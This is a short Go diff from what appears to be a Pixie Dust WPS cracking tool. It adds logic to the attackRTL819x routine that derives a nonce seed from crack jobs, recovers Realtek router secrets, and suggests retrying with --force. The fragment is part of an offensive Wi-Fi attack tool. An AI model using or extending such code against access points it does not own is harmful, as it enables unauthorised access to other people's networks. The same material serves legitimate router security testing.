@@ -257,5 +257,17 @@ func (pda *pixieDustAttack) attackRTL819x() {
 		return
 	}
 
-	pda.initCrackJobs(rtl819x)
+	jc := pda.initCrackJobs(rtl819x)
+	pda.nonceSeed = jc.collectCrackJobs()
+
+	if pda.nonceSeed > 0 {
+		if pda.findRTLES() {
+			pda.foundMode = rtl819x
+			return
+		}
+	}
+
+	if !pda.force {
+		fmt.Println("[!] The AP might be vulnerable. Try again with --force or with another (newer) set of data.")
+	}
 }
